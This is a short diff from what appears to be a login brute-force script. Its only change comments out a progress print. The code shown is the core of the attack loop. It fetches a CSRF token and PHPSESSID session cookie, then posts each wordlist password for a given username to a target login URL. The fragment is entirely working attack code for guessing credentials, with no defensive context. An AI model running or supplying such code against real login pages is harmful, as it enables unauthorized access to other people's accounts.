@@ -111,7 +111,7 @@ def attack(username, wordlist, process_queue):
         forge = get_data()  # creating data for the POST request
         data = {fuser: username, passwdf: "", csrf: forge[0], submit_name: submit_value}
         cookie = {"PHPSESSID": forge[1]}
-        print("Trying : " + word, end="\r")
+        # print("Trying : " + word, end="\r")
         sys.stdout.flush()
         data[passwdf] = word
         response = requests.post(target_url, data=data, cookies=cookie)
